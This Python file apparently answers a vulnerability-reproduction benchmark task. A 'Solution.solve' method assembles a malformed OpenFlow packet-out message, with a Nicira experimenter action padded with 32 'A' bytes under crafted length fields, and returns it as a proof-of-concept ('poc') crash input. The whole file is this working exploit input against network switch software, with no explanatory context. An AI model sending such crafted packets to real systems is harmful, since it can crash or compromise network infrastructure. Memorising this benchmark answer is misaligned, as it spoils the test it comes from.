class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'\x01\x0d\x00\x48\x00\x00\x00\x00'
        buffer_id = b'\x00\x00\x00\x00'
        in_port = b'\x00\x00'
        actions_len = b'\x00\x30'
        pad = b'\x00\x00\x00\x00\x00\x00'
        ofp_type = b'\xff\xff'
        ofp_len = b'\x00\x30'
        experimenter = b'\x00\x00\x23\x20'
        nx_type = b'\x00\x01'
        nx_len = b'\x00\x28'
        prop_type = b'\x00\x01'
        prop_len = b'\x00\x24'
        prop_data = b'A' * 32
        action = ofp_type + ofp_len + experimenter + nx_type + nx_len + prop_type + prop_len + prop_data
        message_pad = b'\x00\x00'
        poc = header + buffer_id + in_port + actions_len + pad + action + message_pad
        return poc
